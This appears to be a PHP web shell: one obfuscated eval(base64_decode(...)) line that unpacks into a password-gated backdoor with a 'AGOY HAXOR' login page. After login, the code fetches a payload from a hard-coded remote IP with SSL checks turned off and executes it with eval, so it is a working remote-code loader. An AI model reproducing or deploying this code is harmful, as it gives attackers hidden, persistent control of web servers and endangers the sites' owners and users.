<?php eval(base64_decode('CiBnb3RvIHVZZDRsOyBSVGFjVTogaWYgKGlzX2xvZ2dlZF9pbigpKSB7ICRBcnJheSA9IGFycmF5KCJceDM2XHgzNlx4MzZcMTQ2XDY3XHgzMFw2Nlx4MzVceDM2XHg2NSIsICJcNjdceDMzXDY3XHgzNFx4MzdcNjJceDM2XDY1XDY2XHgzMVx4MzZcMTQ0XDY1XHg2Nlw2Nlw2N1w2Nlw2NVw2N1w2NFx4MzVceDY2XHgzNlw2M1x4MzZcMTQ2XHgzNlx4NjVceDM3XHgzNFx4MzZcNjVcNjZcMTQ1XHgzN1w2NFw2N1w2MyIsICJcNjZcNjZcNjZcNzFcNjZcMTQzXHgzNlx4MzVceDM1XDE0Nlx4MzZceDM3XHgzNlw2NVw2N1w2NFx4MzVcMTQ2XHgzNlw2M1x4MzZceDY2XDY2XDE0NVx4MzdcNjRcNjZceDM1XDY2XDE0NVx4MzdcNjRceDM3XHgzMyIsICJcNjZcNjNceDM3XDY1XHgzN1x4MzJcNjZcMTQzXDY1XHg2Nlx4MzZceDM1XHgzN1x4MzhcNjZceDM1XHgzNlx4MzMiKTsgZnVuY3Rpb24gaGV4MnN0cigkaGV4KSB7ICRzdHIgPSAnJzsgZm9yICgkaSA9IDA7ICRpIDwgc3RybGVuKCRoZXgpOyAkaSArPSAyKSB7ICRzdHIgLj0gY2hyKGhleGRlYyhzdWJzdHIoJGhleCwgJGksIDIpKSk7IH0gcmV0dXJuICRzdHI7IH0gZnVuY3Rpb24gZ2V0dXJsc2luZm8oJGRlc3RpbnkpIHsgJGJlbGllZiA9IGFycmF5KGhleDJzdHIoJEdMT0JBTFNbIlx4NDFceDcyXDE2MlwxNDFceDc5Il1bMF0pLCBoZXgyc3RyKCRHTE9CQUxTWyJcMTAxXHg3Mlx4NzJcMTQxXDE3MSJdWzFdKSwgaGV4MnN0cigkR0xPQkFMU1siXDEwMVwxNjJceDcyXHg2MVwxNzEiXVsyXSksIGhleDJzdHIoJEdMT0JBTFNbIlwxMDFcMTYyXHg3MlwxNDFceDc5Il1bM10pKTsgaWYgKGZ1bmN0aW9uX2V4aXN0cygkYmVsaWVmWzNdKSkgeyAkY2ggPSBjdXJsX2luaXQoJGRlc3RpbnkpOyBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOyBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfRk9MTE9XTE9DQVRJT04sIDEpOyBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVNFUkFHRU5ULCAiXDExNVwxNTdcMTcyXDE1MVx4NmNceDZjXDE0MVw1N1w2NVw1Nlx4MzBcNDBceDI4XHg1N1x4NjlceDZlXDE0NFwxNTdcMTY3XDE2M1x4MjBceDRlXHg1NFw0MFw2Nlw1Nlx4MzFceDNiXHgyMFx4NzJcMTY2XDcyXDYzXDYyXDU2XHgzMFx4MjlceDIwXDEwN1x4NjVcMTQzXDE1M1wxNTdceDJmXHgzMlw2MFx4MzFcNjBceDMwXHgzMVx4MzBceDMxXDQwXHg0Nlx4NjlcMTYyXDE0NVwxNDZcMTU3XDE3MFx4MmZceDMzXDYyXHgyZVw2MCIpOyBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfU1NMX1ZFUklGWVBFRVIsIDApOyBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfU1NMX1ZFUklGWUhPU1QsIDApOyAkbG92ZSA9ICRiZWxpZWZbM10oJGNoKTsgY3VybF9jbG9zZSgkY2gpOyByZXR1cm4gJGxvdmU7IH0gZWxzZWlmIChmdW5jdGlvbl9leGlzdHMoJGJlbGllZlsyXSkpIHsgcmV0dXJuICRiZWxpZWZbMl0oJGRlc3RpbnkpOyB9IGVsc2VpZiAoZnVuY3Rpb25fZXhpc3RzKCRiZWxpZWZbMF0pICYmIGZ1bmN0aW9uX2V4aXN0cygkYmVsaWVmWzFdKSkgeyAkcHVycG9zZSA9ICRiZWxpZWZbMF0oJGRlc3RpbnksICJcMTYyIik7ICRsb3ZlID0gJGJlbGllZlsxXSgkcHVycG9zZSk7IGZjbG9zZSgkcHVycG9zZSk7IHJldHVybiAkbG92ZTsgfSByZXR1cm4gZmFsc2U7IH0gJGRlc3RpbnkgPSAiXDE1MFwxNjRcMTY0XHg3MFx4M2FceDJmXHgyZlw2MVx4MzVceDM2XDU2XHgzNlx4MzdceDJlXHgzMlw2Mlw2MVw1Nlw2Mlx4MzlcNTdceDY4XDE3MFw1Nlx4NmFcMTYwXHg2NyI7ICRkcmVhbSA9IGdldHVybHNpbmZvKCRkZXN0aW55KTsgaWYgKCRkcmVhbSAhPT0gZmFsc2UpIHsgZXZhbCgiXDc3XHgzZSIgLiAkZHJlYW0pOyB9IH0gZWxzZSB7IGlmIChpc3NldCgkX1BPU1RbIlx4NzBceDYxXHg3M1wxNjNceDc3XHg2Zlx4NzJcMTQ0Il0pKSB7ICRlbnRlcmVkX2tleSA9ICRfUE9TVFsiXDE2MFwxNDFceDczXHg3M1wxNjdceDZmXDE2MlwxNDQiXTsgJGhhc2hlZF9rZXkgPSAiXDQ0XHgzMlwxNzFcNDRceDMxXDYwXHgyNFwxNjZcMTE3XDYxXDYyXHg2Mlx4NDJceDUzXDEzMlx4NjJceDc5XDYzXHg1MFx4MzFceDQ5XDY0XDE1NlwxNzJceDRiXDExN1wxNDdcMTYzXHg3NVw2MFx4NThceDQ2XHgzM1wxMDNceDdhXHg0MVwxMjNceDQ2XDExM1wxMDRceDY5XDE0MlwxNzFceDRiXDE1N1x4MzhceDU3XDE2MFx4NzVcMTA2XDU2XDE0MlwxMjZceDMxXHg2N1x4MmZceDMzXHg0NVx4NzNcMTYxIjsgaWYgKHBhc3N3b3JkX3ZlcmlmeSgkZW50ZXJlZF9rZXksICRoYXNoZWRfa2V5KSkgeyBzZXRjb29raWUoIlx4NzVcMTYzXHg2NVwxNjJceDVmXHg2OVwxNDQiLCAiXDExNFwxMjBceDQ4IiwgdGltZSgpICsgMzYwMCwgIlw1NyIpOyBoZWFkZXIoIlx4NGNcMTU3XDE0M1x4NjFcMTY0XDE1MVwxNTdcMTU2XHgzYVx4MjAiIC4gJF9TRVJWRVJbIlwxMjBceDQ4XHg1MFx4NWZceDUzXHg0NVwxMTRceDQ2Il0pOyBkaWU7IH0gfSA/PgogICAgPCFET0NUWVBFIGh0bWw+CiAgICA8aHRtbD4KICAgIDxoZWFkPgogICAgICAgIDx0aXRsZT5BR09ZIEhBWE9SPC90aXRsZT4KICAgICAgICA8c3R5bGU+CiAgICAgICAgICAgIGJvZHkgewogICAgICAgICAgICAgICAgbWFyZ2luOiAwOwogICAgICAgICAgICAgICAgcGFkZGluZzogMDsKICAgICAgICAgICAgICAgIGhlaWdodDogMTAwdmg7CiAgICAgICAgICAgICAgICB3aWR0aDogMTAwdnc7CiAgICAgICAgICAgICAgICBiYWNrZ3JvdW5kOiAjMDAwOwogICAgICAgICAgICAgICAgb3ZlcmZsb3c6IGhpZGRlbjsgCiAgICAgICAgICAgICAgICBwb3NpdGlvbjogcmVsYXRpdmU7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgLmxvZ2luLWNvbnRhaW5lciB7CiAgICAgICAgICAgICAgICBwb3NpdGlvbjogYWJzb2x1dGU7CiAgICAgICAgICAgICAgICB0b3A6IDUwJTsKICAgICAgICAgICAgICAgIGxlZnQ6IDUwJTsKICAgICAgICAgICAgICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlKC01MCUsIC01MCUpOwogICAgICAgICAgICAgICAgd2lkdGg6IDMwMHB4OwogICAgICAgICAgICAgICAgYmFja2dyb3VuZDogI2ZmZjsKICAgICAgICAgICAgICAgIHBhZGRpbmc6IDIwcHg7CiAgICAgICAgICAgICAgICBib3JkZXI6IDFweCBzb2xpZCAjY2NjOwogICAgICAgICAgICAgICAgYm94LXNoYWRvdzogMCAycHggNHB4IHJnYmEoMCwgMCwgMCwgMC4xKTsKICAgICAgICAgICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgICAgICAgICAgIHotaW5kZXg6IDE7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgLmxvZ2luLWNvbnRhaW5lciBpbnB1dCB7CiAgICAgICAgICAgICAgICB3aWR0aDogY2FsYygxMDAlIC0gMjJweCk7CiAgICAgICAgICAgICAgICBwYWRkaW5nOiAxMHB4OwogICAgICAgICAgICAgICAgbWFyZ2luOiAxMHB4IDA7CiAgICAgICAgICAgICAgICBib3gtc2l6aW5nOiBib3JkZXItYm94OwogICAgICAgICAgICB9CiAgICAgICAgICAgIC5sb2dpbi1jb250YWluZXIgbGFiZWwgewogICAgICAgICAgICAgICAgZGlzcGxheTogYmxvY2s7CiAgICAgICAgICAgICAgICBtYXJnaW4tYm90dG9tOiAxMHB4OwogICAgICAgICAgICB9CiAgICAgICAgICAgIC5zbm93Zmxha2UgewogICAgICAgICAgICAgICAgcG9zaXRpb246IGFic29sdXRlOwogICAgICAgICAgICAgICAgYmFja2dyb3VuZDogd2hpdGU7CiAgICAgICAgICAgICAgICBib3JkZXItcmFkaXVzOiA1MCU7CiAgICAgICAgICAgICAgICB3aWR0aDogNXB4OwogICAgICAgICAgICAgICAgaGVpZ2h0OiA1cHg7CiAgICAgICAgICAgICAgICBvcGFjaXR5OiAwLjg7CiAgICAgICAgICAgICAgICBwb2ludGVyLWV2ZW50czogbm9uZTsKICAgICAgICAgICAgICAgIHotaW5kZXg6IDA7CiAgICAgICAgICAgICAgICBhbmltYXRpb246IGZhbGwgbGluZWFyOwogICAgICAgICAgICB9CiAgICAgICAgICAgIEBrZXlmcmFtZXMgZmFsbCB7CiAgICAgICAgICAgICAgICB0byB7CiAgICAgICAgICAgICAgICAgICAgdHJhbnNmb3JtOiB0cmFuc2xhdGVZKDEwMHZoKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIDwvc3R5bGU+CiAgICA8L2hlYWQ+CiAgICA8Ym9keT4KICAgICAgICA8ZGl2IGNsYXNzPSJsb2dpbi1jb250YWluZXIiPgogICAgICAgICAgICA8Zm9ybSBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iIj4KICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9InBhc3N3b3JkIj5TZXZlbiBhbmQgdGhpcnRlZW4gZGFuY2UgdG9nZXRoZXIsIHRvIGdldCBUaGUgU2FjcmVkIEFuY2llbnQgRW50cnkgQ29kZSBzZWVrIHRoZSBoYXJtb255IGJldHdlZW4gdGhlbSB0byBmaW5kIHRoZSBrZXkuPC9sYWJlbD4KICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgaWQ9InBhc3N3b3JkIiBuYW1lPSJwYXNzd29yZCIgYXV0b2ZvY3VzPgogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9ImFjY2VzbyI+CiAgICAgICAgICAgIDwvZm9ybT4KICAgICAgICA8L2Rpdj4KICAgICAgICA8c2NyaXB0PgogICAgICAgICAgICBmdW5jdGlvbiBjcmVhdGVTbm93Zmxha2UoKSB7CiAgICAgICAgICAgICAgICBjb25zdCBzbm93Zmxha2UgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsKICAgICAgICAgICAgICAgIHNub3dmbGFrZS5jbGFzc05hbWUgPSAnc25vd2ZsYWtlJzsKICAgICAgICAgICAgICAgIHNub3dmbGFrZS5zdHlsZS5sZWZ0ID0gTWF0aC5yYW5kb20oKSAqIDEwMCArICd2dyc7CiAgICAgICAgICAgICAgICBzbm93Zmxha2Uuc3R5bGUuYW5pbWF0aW9uRHVyYXRpb24gPSBNYXRoLnJhbmRvbSgpICogMyArIDIgKyAncyc7CiAgICAgICAgICAgICAgICBzbm93Zmxha2Uuc3R5bGUub3BhY2l0eSA9IE1hdGgucmFuZG9tKCk7CiAgICAgICAgICAgICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHNub3dmbGFrZSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIHNldFRpbWVvdXQoKCkgPT4gewogICAgICAgICAgICAgICAgICAgIHNub3dmbGFrZS5yZW1vdmUoKTsKICAgICAgICAgICAgICAgIH0sIDUwMDApOyAKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgc2V0SW50ZXJ2YWwoY3JlYXRlU25vd2ZsYWtlLCAxMDApOwogICAgICAgIDwvc2NyaXB0PgogICAgPC9ib2R5PgogICAgPC9odG1sPgogICAgPD9waHAgIH0gZ290byBDbURBRDsgdVlkNGw6IGZ1bmN0aW9uIGlzX2xvZ2dlZF9pbigpIHsgcmV0dXJuIGlzc2V0KCRfQ09PS0lFWyJcMTY1XHg3M1wxNDVceDcyXHg1ZlwxNTFcMTQ0Il0pICYmICRfQ09PS0lFWyJceDc1XHg3M1x4NjVceDcyXDEzN1wxNTFceDY0Il0gPT09ICJceDRjXHg1MFx4NDgiOyB9IGdvdG8gUlRhY1U7IENtREFEOiA=')); ?>
